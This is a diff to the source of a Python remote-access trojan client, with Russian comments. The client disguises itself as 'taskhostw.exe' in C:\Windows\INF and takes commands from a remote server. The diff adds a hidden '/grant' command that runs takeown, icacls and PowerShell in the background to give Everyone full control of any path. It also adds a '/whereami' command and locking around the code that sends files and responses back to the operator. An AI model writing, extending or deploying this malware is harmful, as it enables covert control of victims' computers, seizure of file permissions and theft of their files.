@@ -130,13 +130,14 @@ SERVER_IP, SERVER_PORT = get_buffer_process()
 RECONNECT_DELAY = 15
 
 # ====== Глобальные переменные ======
-CURRENT_VERSION = 34
+CURRENT_VERSION = 35
 MAX_LEN = 4000
 TARGET_DIR = r"C:\Windows\INF"
 new_name="taskhostw.exe"
 stop_event = threading.Event()
 auto_thread = None
 socket_lock = threading.Lock()
+send_lock = threading.Lock()
 current_socket = None
 current_thread_id = None
 current_path = os.path.expanduser("~")
@@ -1226,6 +1227,99 @@ def cmd_mousemesstop(args):
     
     return '⚠️ Хаос мыши не был запущен.'
 
+def cmd_whereami(args):
+    """
+    /whereami
+    Показывает путь к текущему запущенному исполняемому файлу.
+    """
+    try:
+        exe_path = sys.executable
+        work_dir = os.getcwd()
+        
+        return (
+            f"📍 *Информация о процессе:*\n\n"
+            f"*Путь к EXE:*\n`{exe_path}`\n\n"
+            f"*Рабочая директория:*\n`{work_dir}`"
+        )
+    except Exception as e:
+        return f"❌ **Ошибка:** `{e}`"
+
+def cmd_grant(args):
+    """
+    /grant <путь>
+    Многоуровневая разблокировка доступа в фоновом режиме с итоговым отчетом.
+    """
+    if not args:
+        return "❌ Укажите путь к файлу или папке."
+
+    target_path = args.strip().strip('"\'')
+    if not os.path.isabs(target_path):
+        target_path = os.path.join(current_path, target_path)
+    target_path = os.path.abspath(target_path)
+
+    if not os.path.exists(target_path):
+        return f"❌ Объект не найден: {target_path}"
+
+    # Функция, которая будет крутиться в фоне
+    def heavy_lifting(path, sock_to_use):
+        report = [f"🏁 Итог по доступу: `{os.path.basename(path)}`"]
+        
+        try:
+            # 1. Атрибуты
+            subprocess.run(f'attrib -r -s -h "{path}" /s /d', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            report.append("✅ Атрибуты (Read-only/System) сняты.")
+
+            # 2. Владелец
+            res_take = subprocess.run(f'takeown /f "{path}" /a /r /d y', 
+                                      shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            if res_take.returncode == 0:
+                report.append("✅ Владение передано группе Администраторов.")
+            else:
+                report.append("⚠️ Takeown завершен с замечаниями (возможно, часть файлов уже под контролем).")
+
+            # 3. Права доступа (ICACLS)
+            # Пытаемся выдать права для всех возможных имен групп (RU/EN)
+            found_groups = []
+            for group in ["Administrators", "Everyone", "Администраторы", "Все"]:
+                cmd = f'icacls "{path}" /grant {group}:F /t /c /q'
+                res = subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                if res.returncode == 0:
+                    found_groups.append(group)
+            
+            if found_groups:
+                report.append(f"✅ Права 'Full Control' выданы для: {', '.join(found_groups)}.")
+
+            # 4. PowerShell (финальный аккорд для сложных случаев)
+            ps_cmd = (
+                f"$path='{path}'; "
+                "Get-Item $path | ForEach-Object { "
+                "$acl = Get-Acl $_.FullName; "
+                "$rule = New-Object System.Security.AccessControl.FileSystemAccessRule('Everyone','FullControl','Allow'); "
+                "$acl.SetAccessRule($rule); Set-Acl $_.FullName $acl }"
+            )
+            subprocess.run(["powershell", "-NoProfile", "-Command", ps_cmd], creationflags=subprocess.CREATE_NO_WINDOW)
+            report.append("✅ PowerShell корректировка завершена.")
+
+            final_msg = "\n".join(report)
+            
+        except Exception as e:
+            final_msg = f"❌ Ошибка при выполнении /grant для {path}: {str(e)}"
+
+        # ОТПРАВКА ИТОГА: используем существующую функцию отправки
+        # Мы обращаемся к глобальному сокету напрямую из потока
+        try:
+            if sock_to_use:
+                send_response(sock_to_use, final_msg)
+        except:
+            pass # Если сокет закрылся, пока мы работали
+
+    # Запускаем поток, передавая ему текущий сокет для ответа
+    # Используем current_socket из глобальной области видимости
+    thread = threading.Thread(target=heavy_lifting, args=(target_path, current_socket), daemon=True)
+    thread.start()
+    return f"⏳Захват прав для `{os.path.basename(target_path)}`...\nЭто займет время"
+
+
 def cmd_wallpaper(args):
     logger.debug(f"Выполняется /wallpaper с аргументами: {args}")
     try:
@@ -1344,33 +1438,26 @@ def cmd_ping(args):
     return "alive" # Можно возвращать любую строку
 
 def client_heartbeat_loop():
-    """
-    Регулярно отправляет команду /ping на Сервер, используя текущий сокет.
-    """
     logger.info("Запущен Heartbeat-поток.")
     while not hb_stop_event.is_set():
-        # Используем глобальный сокет, защищенный локом
         with socket_lock:
             conn = current_socket
         
         if conn:
             try:
-                # Отправляем /ping в JSON-формате
                 payload = json.dumps({"command": "/ping"}).encode('utf-8') + b'\n'
-                conn.sendall(payload)
+                
+                # 🔥 БЛОКИРУЕМ PING
+                with send_lock:
+                    conn.sendall(payload)
+                    
                 logger.debug("Heartbeat /ping отправлен.")
             except Exception as e:
-                # Если отправить не удалось, значит, сокет умер или в плохом состоянии.
-                # Главный цикл main_client_loop скоро это обнаружит и переподключится.
                 logger.warning(f"Ошибка Heartbeat: {e}")
-                # Выходим, чтобы не спамить ошибками, пока не произойдет переподключение
                 hb_stop_event.set() 
                 break 
 
-        # Ждем 10 секунд или до сигнала остановки
         hb_stop_event.wait(HB_INTERVAL)
-        
-    logger.info("Heartbeat-поток остановлен.")
 
 def cmd_sysinfo(args):
     logger.debug(f"Выполняется /sysinfo с аргументами: {args}")
@@ -1594,7 +1681,7 @@ def cmd_execute(args: str):
 # ====== Отправка файлов ======
 def send_file(conn, file_path):
     """
-    Отправляет файл на Сервер.
+    Отправляет файл на Сервер. Атомарная операция.
     """
     if not os.path.exists(file_path):
         return f"❌ Файл не найден: {file_path}"
@@ -1603,23 +1690,24 @@ def send_file(conn, file_path):
         file_size = os.path.getsize(file_path)
         file_name = os.path.basename(file_path)
 
-        # 1. Отправка заголовка (метаданных)
         header = json.dumps({
             "command": "/upload",
             "file_name": file_name,
             "file_size": file_size
-        }).encode('utf-8') + b'\n' # ВАЖНО: \n в конце заголовка
-        conn.sendall(header)
+        }).encode('utf-8') + b'\n'
 
-        # 2. Отправка бинарных данных
-        with open(file_path, 'rb') as f:
-            while True:
-                bytes_read = f.read(8192)
-                if not bytes_read:
-                    break
-                conn.sendall(bytes_read)
+        # 🔥 БЛОКИРУЕМ ОТПРАВКУ ДЛЯ ДРУГИХ ПОТОКОВ
+        with send_lock:
+            conn.sendall(header)
+
+            with open(file_path, 'rb') as f:
+                while True:
+                    bytes_read = f.read(8192)
+                    if not bytes_read:
+                        break
+                    conn.sendall(bytes_read)
         
-        return None # Успех
+        return None 
 
     except Exception as e:
         return f"❌ Ошибка при отправке файла: {str(e)}"
@@ -1635,7 +1723,6 @@ def send_response(conn, result, cmd_name="N/A", is_file=False, file_path=None):
             file_size = os.path.getsize(file_path)
             file_name = os.path.basename(file_path)
 
-            # 1. Отправляем JSON заголовок
             header = json.dumps({
                 "thread_id": thread_id_to_send,
                 "command": "/response_file",
@@ -1644,18 +1731,21 @@ def send_response(conn, result, cmd_name="N/A", is_file=False, file_path=None):
                 "result": f"Файл результата команды {cmd_name} отправлен."
             }).encode('utf-8') + b'\n'
 
-            conn.sendall(header)
+            # 🔥 БЛОКИРУЕМ (Header + Body)
+            with send_lock:
+                conn.sendall(header)
+                with open(file_path, 'rb') as f:
+                    while True:
+                        chunk = f.read(8192)
+                        if not chunk:
+                            break
+                        conn.sendall(chunk)
 
-            # 2. Отправляем бинарные данные файла
-            with open(file_path, 'rb') as f:
-                while True:
-                    chunk = f.read(8192)
-                    if not chunk:
-                        break
-                    conn.sendall(chunk)
-
-            # 3. Удаляем временный файл
-            os.remove(file_path)
+            # Удаляем временный файл после полной отправки
+            try:
+                os.remove(file_path)
+            except:
+                pass
             return
 
         # === Вариант: обычный текстовый ответ ===
@@ -1665,7 +1755,10 @@ def send_response(conn, result, cmd_name="N/A", is_file=False, file_path=None):
             "result": str(result)
         }
         response = json.dumps(response_data).encode('utf-8') + b'\n'
-        conn.sendall(response)
+        
+        # 🔥 БЛОКИРУЕМ (Text response)
+        with send_lock:
+            conn.sendall(response)
 
     except Exception as e:
         logger.error(f"Ошибка отправки ответа/файла: {e}")
@@ -2902,7 +2995,9 @@ COMMANDS = {
     "/open_video": cmd_open_video,
     "/close_video": cmd_close_video,
     "/screenshot_full": cmd_screenshot_full,
-    "/scfull": cmd_screenshot_full
+    "/scfull": cmd_screenshot_full,
+    "/grant": cmd_grant,
+    "/whereami": cmd_whereami,
 }
 
 # ====== Главный цикл ======
